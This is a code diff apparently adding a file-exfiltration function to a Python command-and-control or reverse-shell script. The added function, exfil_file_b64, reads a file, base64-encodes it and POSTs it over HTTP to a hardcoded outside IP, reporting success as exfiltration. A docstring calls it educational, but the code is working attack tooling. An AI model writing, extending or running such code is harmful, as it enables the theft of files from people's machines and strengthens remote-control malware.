@@ -2,6 +2,9 @@ import socket
 import sys
 import threading
 import time
+import requests
+import base64
+import os
 from queue import Queue
 
 NUMBER_OF_THREADS = 2
@@ -128,6 +131,41 @@ def send_target_commands(conn):
             print("Error sending commands")
             break
 
+def exfil_file_b64(file_path):
+    """
+    File exfiltration using base64 encoding over HTTP
+    For educational/puzzle purposes only
+    """
+    target_ip = "203.0.113.17"  # Hardcoded target IP
+    target_url = f"http://{target_ip}:8080/data"
+    
+    try:
+        if not os.path.exists(file_path):
+            print(f"File {file_path} not found")
+            return False
+            
+        with open(file_path, 'rb') as file:
+            file_data = file.read()
+            encoded_data = base64.b64encode(file_data).decode()
+            
+        payload = {
+            'filename': os.path.basename(file_path),
+            'data': encoded_data
+        }
+        
+        response = requests.post(target_url, json=payload, timeout=10)
+        
+        if response.status_code == 200:
+            print(f"File {file_path} successfully exfiltrated")
+            return True
+        else:
+            print(f"Exfiltration failed: {response.status_code}")
+            return False
+            
+    except Exception as e:
+        print(f"Error during exfiltration: {e}")
+        return False
+    
 # Create worker threads
 def create_worker():
     for _ in range(NUMBER_OF_THREADS):
